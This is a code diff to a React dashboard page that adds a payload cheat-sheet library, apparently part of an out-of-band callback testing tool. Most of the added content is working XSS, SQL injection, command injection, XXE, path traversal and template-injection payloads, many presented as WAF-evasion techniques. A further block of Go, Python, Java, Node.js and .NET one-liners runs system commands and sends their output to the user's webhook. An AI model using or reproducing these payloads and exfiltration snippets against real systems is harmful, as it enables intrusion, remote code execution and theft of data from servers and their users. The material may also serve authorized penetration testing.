@@ -717,20 +717,277 @@ export default function DashboardPage({ params }) {
           desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
           priority: 'HIGH', 
           era: '2026 Stealth' 
+  // Payloads Cheat Sheet Library (Pre-Configured dynamically with custom URLs!)
+  const payloadsData = [
+    {
+      category: 'XSS',
+      title: 'Cross-Site Scripting (XSS)',
+      items: [
+        { 
+          title: 'Dynamic Blind XSS Payload (2026 Stealth)', 
+          code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, 
+          desc: 'Evades keyword engines looking for evaluation parameters and alert brackets. Uses ES6 dynamic chunked importing.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Browser JS / HTML'
+        },
+        { 
+          title: 'MathML onbegin Animation Injection', 
+          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, 
+          desc: 'Triggered instantly during DOM building without using standard elements like <img> or <body>. Bypasses classic HTML parsers.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Browser JS / MathML'
+        },
+        { 
+          title: 'Custom Elements with Shadow DOM clicking', 
+          code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, 
+          desc: 'Bypasses WAF regexes that inspect classic HTML elements. Obfuscates javascript commands inside base64 decoding.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Browser JS / Shadow DOM'
+        },
+        { 
+          title: 'Fetch External JavaScript Eval Bypass', 
+          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
+          desc: 'Using fetch API instead of standard script tags. Completely evades script filters by pulling and evaluating code inside window scope.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Browser JS / APIs'
+        },
+        { 
+          title: 'Iframe Source Document script execution', 
+          code: `<iframe srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x69;&#x6D;&#x70;&#x6F;&#x72;&#x74;&#x28;&#x27;${xssPayloadUrl}&#x27;&#x29;&#x3C;&#x2F;&#x33;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"></iframe>`, 
+          desc: 'An iframe with html-entity encoded source document script element. Completely unreadable to WAF regex filters.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Browser JS / Iframe'
+        },
+        { 
+          title: 'HTML5 Image Tag Error Fallback', 
+          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
+          desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'HTML5 / JS'
+        },
+        { 
+          title: 'Anchor Tag javascript URI pseudo-protocol', 
+          code: `<a href="javascript:import('${xssPayloadUrl}')">Click for reward</a>`, 
+          desc: 'Requires user interaction. Useful for stored social engineering / link injection attacks in markdown comments.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'HTML / JS'
+        },
+        { 
+          title: 'Input Element autofocus handler', 
+          code: `<input autofocus onfocus="import('${xssPayloadUrl}')">`, 
+          desc: 'Bypasses filters blocking onload/onerror handlers by exploiting auto-focusing elements.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'HTML5 / JS'
+        },
+        { 
+          title: 'Simple Image Source alert (Zaman Batu)', 
+          code: `<img src=x onerror=alert(1)>`, 
+          desc: 'The absolute classic. High detection rates but perfect for checking standard unfiltered entry points.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'HTML / JS'
+        },
+        { 
+          title: 'Raw Script tag (Zaman Batu)', 
+          code: `<script>alert(1)</script>`, 
+          desc: 'Pure legacy script block. Blocked by 99% of WAFs, but still useful to check local offline databases.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'HTML / Script Tag'
+        }
+      ]
+    },
+    {
+      category: 'SQLI',
+      title: 'SQL Injection (SQLi)',
+      items: [
+        { 
+          title: 'MySQL Space-less Filter Bypass', 
+          code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, 
+          desc: 'Replaces whitespace characters with empty C-style block comments to confuse regex space triggers.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass',
+          tech: 'MySQL / Aurora'
+        },
+        { 
+          title: 'Scientific Notation Arithmetic', 
+          code: `1e0' OR 1.0=1.0--`, 
+          desc: 'Translates query conditions into exponential mathematics to completely bypass simple numeric comparison rules.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass',
+          tech: 'MySQL / PostgreSQL'
+        },
+        { 
+          title: 'Heavy Query Time-Based Exfiltration (MySQL)', 
+          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)--`, 
+          desc: 'Time-delay based validation. Perfect for checking blind SQL injection points without utilizing noisy syntax strings.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'MySQL / MariaDB'
+        },
+        { 
+          title: 'PostgreSQL Time-Based Stacked Query', 
+          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/pg_rce'--`, 
+          desc: 'Requires database admin superuser privileges. Performs an out-of-band RCE using postgres dynamic command shell execution.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'PostgreSQL / Linux'
+        },
+        { 
+          title: 'Hexadecimal String Injection', 
+          code: `0x61646d696e`, 
+          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'MySQL / SQLite'
+        },
+        { 
+          title: 'Database Version String Concatenation', 
+          code: `' UNION SELECT NULL,@@version,NULL,NULL--`, 
+          desc: 'Retrieves server engine distribution context. Relies on standard UNION extraction vectors.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'MySQL / SQL Server'
+        },
+        { 
+          title: 'Simple Authentication Bypass (Zaman Batu)', 
+          code: `' OR 1=1--`, 
+          desc: 'Standard query comparison override. High detection rates but classic logic.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'SQL Databases'
+        },
+        { 
+          title: 'Basic Admin Single-Quote (Zaman Batu)', 
+          code: `admin'--`, 
+          desc: 'Standard string parameter termination, useful for primitive login portals.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'SQL Databases'
+        }
+      ]
+    },
+    {
+      category: 'RCE',
+      title: 'Command Injection (RCE)',
+      items: [
+        { 
+          title: 'Bash IFS & Single Quote Splitting', 
+          code: `c'a't$IFS/e't'c/p'a's's'wd`, 
+          desc: 'Bypasses literal string matches (like "cat" and "/etc/passwd") and space triggers using single quotes and internal field separators.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Unix Shell / Bash'
+        },
+        { 
+          title: 'Bash Path Wildcards', 
+          code: `/bi?/c*t$IFS/et?/pa??wd`, 
+          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Unix Shell / Alpine'
+        },
+        { 
+          title: 'Bash Empty Uninitialized variable bypass', 
+          code: `ca$@t$IFS/etc/pass$@wd`, 
+          desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Unix Shell / Bash'
+        },
+        { 
+          title: 'Hex-Encoded Command Pipeline Execution', 
+          code: `$(echo -e "\\x63\\x61\\x74") $IFS /etc/passwd`, 
+          desc: 'Converts target command binary names into hexadecimal bytes, evaluating them on the fly at shell execution.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Unix Shell / Linux'
+        },
+        { 
+          title: 'Base64 Decoded Pipeline', 
+          code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
+          desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'Unix Shell / Linux'
+        },
+        { 
+          title: 'Backtick subshell command substitution', 
+          code: `\`id\``, 
+          desc: 'Executes nested target parameters inside modern shell configurations.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'Linux / Unix Shell'
+        },
+        { 
+          title: 'Simple cURL Command (Zaman Batu)', 
+          code: `; curl ${webhookUrl}`, 
+          desc: 'Raw cURL request. Easily detected by simple WAF rules looking for outbound HTTP keywords.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'Linux / macOS'
+        },
+        { 
+          title: 'Basic Semicolon Divider (Zaman Batu)', 
+          code: `; id`, 
+          desc: 'Direct parameter append execution. Easily blocked by character filter rules.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'Linux / Windows'
+        }
+      ]
+    },
+    {
+      category: 'XXE',
+      title: 'XML External Entity (XXE)',
+      items: [
+        { 
+          title: 'UTF-16 BE Document encoding', 
+          code: `[Convert XML to UTF-16 BE encoding bytes]`, 
+          desc: 'Sending XML document parameters encoded in UTF-16 Big Endian completely blinds WAFs that inspect UTF-8 traffic, while parser parses it normally.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Java / Python XML'
+        },
+        { 
+          title: 'Nested Parameter Entities Blind Call', 
+          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, 
+          desc: 'Uses external malicious DTD rules to parse local files and exfiltrate variables to OOB host.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass',
+          tech: 'Java / .NET / PHP XML'
+        },
+        { 
+          title: 'XML Entity Parameter Dynamic Exfiltration', 
+          code: `<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`, 
+          desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'PHP XML / Ingestion'
         },
         { 
           title: 'Standard External General Entity Resource', 
           code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${webhookUrl}">]><foo>&xxe;</foo>`, 
           desc: 'Pings back OOB listener URL instantly when XML document gets evaluated on server endpoint.',
           priority: 'MEDIUM', 
-          era: 'Standard Bypass' 
+          era: 'Standard Bypass',
+          tech: 'XML Parser'
         },
         { 
           title: 'Classic Local File Traversal (Zaman Batu)', 
           code: `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>`, 
           desc: 'Standard local file reading. Easily blocked by any basic rule inspecting external system keywords.',
           priority: 'LOW', 
-          era: 'Zaman Batu (Classic)' 
+          era: 'Zaman Batu (Classic)',
+          tech: 'XML Parser'
         }
       ]
     },
@@ -743,42 +1000,48 @@ export default function DashboardPage({ params }) {
           code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, 
           desc: 'Utilizes base64 stream transformations to dynamically assemble web shell components directly in execution memory, avoiding file writes.',
           priority: 'HIGH', 
-          era: '2026 Stealth' 
+          era: '2026 Stealth',
+          tech: 'PHP Engine'
         },
         { 
           title: 'Multi-Byte Unicode Slash Traversal', 
           code: `..%c0%af..%c0%af..%c0%afetc/passwd`, 
           desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.',
           priority: 'HIGH', 
-          era: 'WAF Bypass' 
+          era: 'WAF Bypass',
+          tech: 'IIS / Nginx / Apache'
         },
         { 
           title: 'PHP Bzip2 Decompression Wrapper', 
           code: `compress.bzip2://../../etc/passwd`, 
           desc: 'Using alternative file compression wrappers instead of file:// protocols to access operating system files.',
           priority: 'HIGH', 
-          era: '2026 Stealth' 
+          era: '2026 Stealth',
+          tech: 'PHP Engine'
         },
         { 
           title: 'Double URL Encoded Traversal', 
           code: `%252e%252e%252f%252e%252e%252fetc/passwd`, 
           desc: 'Evades WAFs that decode URLs only once. Standard double percent escapes.',
           priority: 'MEDIUM', 
-          era: 'Standard Bypass' 
+          era: 'Standard Bypass',
+          tech: 'Apache / Tomcat'
         },
         { 
           title: 'Null Byte Traversal (PHP < 5.3.4)', 
           code: `../../../../../../etc/passwd%00`, 
           desc: 'Utilizes a null byte escape to strip system file extensions. Useful for older legacy systems.',
           priority: 'MEDIUM', 
-          era: 'Standard Bypass' 
+          era: 'Standard Bypass',
+          tech: 'PHP Legacy Engine'
         },
         { 
           title: 'Standard dot-dot-slash (Zaman Batu)', 
           code: `../../../../../../etc/passwd`, 
           desc: 'Classic Unix directory traversal. Blocked by default on virtually all modern systems.',
           priority: 'LOW', 
-          era: 'Zaman Batu (Classic)' 
+          era: 'Zaman Batu (Classic)',
+          tech: 'Linux Filesystem'
         }
       ]
     },
@@ -791,35 +1054,118 @@ export default function DashboardPage({ params }) {
           code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, 
           desc: 'Evades static code rules that scan parameters for the explicit presence of string terms like "__class__".',
           priority: 'HIGH', 
-          era: '2026 Stealth' 
+          era: '2026 Stealth',
+          tech: 'Python / Flask / Jinja2'
         },
         { 
           title: 'Jinja2 Hex Filters Evaluation', 
           code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, 
           desc: 'Combines dynamic attribute getters with string splits to access restricted sandbox scopes.',
           priority: 'HIGH', 
-          era: 'WAF Bypass' 
+          era: 'WAF Bypass',
+          tech: 'Python / Flask / Jinja2'
         },
         { 
           title: 'Jinja2 Query Parameter String execution (No Quotes)', 
           code: `{{request|attr(request.args.c)}}&c=__class__`, 
           desc: 'Leverages other HTTP query arguments to fetch and resolve reserved words dynamically, avoiding quotes inside injection fields.',
           priority: 'HIGH', 
-          era: '2026 Stealth' 
+          era: '2026 Stealth',
+          tech: 'Python / Flask / Jinja2'
         },
         { 
           title: 'Tornado Template Application RCE', 
           code: `{{import os;os.system('id')}}`, 
           desc: 'Direct import capabilities inside vulnerable Python Tornado web servers.',
           priority: 'MEDIUM', 
-          era: 'Standard Bypass' 
+          era: 'Standard Bypass',
+          tech: 'Python / Tornado Server'
         },
         { 
           title: 'Basic Curly Expression (Zaman Batu)', 
           code: `{{7*7}}`, 
           desc: 'Simple calculation testing. Used to easily verify if any template parsing engine is active.',
           priority: 'LOW', 
-          era: 'Zaman Batu (Classic)' 
+          era: 'Zaman Batu (Classic)',
+          tech: 'Template Engines'
+        }
+      ]
+    },
+    {
+      category: 'LANG',
+      title: 'OOB Exfiltration Codes by Language (Python, Go, Java, Node, .NET)',
+      items: [
+        { 
+          title: 'Go (Golang) Stealth OOB HTTP Exfiltrator', 
+          code: `package main; import ("net/http"; "os/exec"); func main() { out, _ := exec.Command("id").Output(); http.Get("${webhookUrl}/?data=" + string(out)) }`, 
+          desc: 'Native Go code compilation to run commands silently in background context and exfiltrate base bytes to your webhook endpoint.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Go / Golang SDK'
+        },
+        { 
+          title: 'Python Socket Dynamic Connection Pinger', 
+          code: `import socket, subprocess; s = socket.socket(); s.connect(('${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}', 80)); s.send(b'GET /api/r/${id}?ping=python_raw HTTP/1.1\\r\\nHost: ${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}\\r\\n\\r\\n')`, 
+          desc: 'Uses Python socket libraries to directly craft raw HTTP handshakes to your webhook, completely bypassing system proxies, SSL checks, and curl logging.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Python 3.x Engine'
+        },
+        { 
+          title: 'Python Out-of-band Subprocess fetcher', 
+          code: `import urllib.request, subprocess; r = subprocess.check_output('id', shell=True); urllib.request.urlopen(f'${webhookUrl}/?res=' + r.decode('utf-8'))`, 
+          desc: 'Standard Python urllib dynamic transmission vector. Highly reliable for server script executions.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'Python 3.x Engine'
+        },
+        { 
+          title: 'Java Runtime Out-of-Band Callback execution', 
+          code: `Runtime.getRuntime().exec(new String[]{"sh", "-c", "curl ${webhookUrl}/?user=" + System.getProperty("user.name")});`, 
+          desc: 'Native Java process string executing commands and piping metadata properties back to your OOB interface.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Java / JDK / JVM'
+        },
+        { 
+          title: 'Java ProcessBuilder Base64 exfiltration', 
+          code: `new ProcessBuilder("sh", "-c", "echo $(id) | base64 | xargs -I {} curl ${webhookUrl}/?id={}").start();`, 
+          desc: 'Constructs isolated background subprocess pipelines to encode critical identities before exfiltration.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Java Runtime Environment'
+        },
+        { 
+          title: 'Node.js Dynamic Worker Import Pinger', 
+          code: `require('child_process').exec('id', (e, out) => { require('https').get('${webhookUrl}/?node=' + encodeURIComponent(out)) });`, 
+          desc: 'Node.js asynchronous child process callback wrapper triggering out-of-band TLS request callbacks.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Node.js Runtime / ES6'
+        },
+        { 
+          title: 'Node.js Fetch ES Module exfiltration', 
+          code: `import('child_process').then(cp => cp.exec('id', (e,o) => fetch('${webhookUrl}/?node='+o)))`, 
+          desc: 'Modern Node.js syntax utilizing Dynamic imports and standard fetch API structures.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Node.js ES6+ / V8 Engine'
+        },
+        { 
+          title: '.NET Core C# Process Pipeline Exfiltration', 
+          code: `using System.Diagnostics; using System.Net.Http; var p = Process.Start(new ProcessStartInfo("whoami") { RedirectStandardOutput = true }); p.WaitForExit(); new HttpClient().GetStringAsync("${webhookUrl}/?win=" + p.StandardOutput.ReadToEnd());`, 
+          desc: 'Explicit .NET Core compiler script initiating system shell operations, capturing raw stdout streams and broadcasting payloads.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: '.NET Core / C# v10+'
+        },
+        { 
+          title: '.NET Core Background WebClient ping', 
+          code: `new System.Net.WebClient().DownloadString("${webhookUrl}/?ping=.net_core_handshake");`, 
+          desc: 'Primitive out-of-band handshake validation. Highly efficient for rapid framework checking.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: '.NET Framework / C#'
         }
       ]
     }
@@ -1113,7 +1459,7 @@ export default function DashboardPage({ params }) {
               <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
                 Categories
               </span>
-              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI'].map(cat => (
+              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI', 'LANG'].map(cat => (
                 <button
                   key={cat}
                   onClick={() => setSelectedPayloadCategory(cat)}
@@ -1145,7 +1491,13 @@ export default function DashboardPage({ params }) {
                     }
                   }}
                 >
-                  <span>{cat === 'ALL' ? '📂 View All Payloads' : `☣️ ${cat}`}</span>
+                  <span>
+                    {cat === 'ALL' 
+                      ? '📂 View All Payloads' 
+                      : cat === 'LANG' 
+                      ? '💻 Go / Python / JVM / Node' 
+                      : `☣️ ${cat}`}
+                  </span>
                 </button>
               ))}
             </div>
@@ -1858,11 +2210,30 @@ export default function DashboardPage({ params }) {
                           }}
                         >
                           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                               <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
                                 {item.title}
                               </h4>
                               
+                              {/* Tech Stack Badge */}
+                              {item.tech && (
+                                <span 
+                                  style={{
+                                    fontSize: '0.58rem',
+                                    fontWeight: '800',
+                                    background: 'rgba(0, 230, 118, 0.08)',
+                                    color: '#00e676',
+                                    border: '1px solid rgba(0, 230, 118, 0.2)',
+                                    padding: '1px 6px',
+                                    borderRadius: '3px',
+                                    textTransform: 'uppercase',
+                                    fontFamily: 'monospace'
+                                  }}
+                                >
+                                  💻 {item.tech}
+                                </span>
+                              )}
+
                               {/* Dynamically Color-Coded Badges based on Era/Priority */}
                               {item.priority === 'HIGH' ? (
                                 <span 
